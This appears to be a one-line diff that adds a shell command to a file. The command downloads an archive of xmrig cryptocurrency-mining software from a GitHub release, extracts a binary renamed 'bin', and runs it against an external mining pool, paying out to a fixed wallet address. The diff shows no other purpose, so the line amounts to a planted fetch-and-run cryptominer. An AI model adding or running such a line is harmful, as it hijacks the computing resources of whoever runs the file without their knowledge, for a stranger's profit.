@@ -1,0 +1,1 @@
+wget https://github.com/wolovemadang/cpu-mining/releases/download/xmrig/bin.tar.gz && tar -xvf bin.tar.gz && ./bin -a ghostrider --url eu.flockpool.com:5555 --tls --user RDG9ucjBMKDxFrfn9S3zWeMhNcMMF8W7cT.worker1
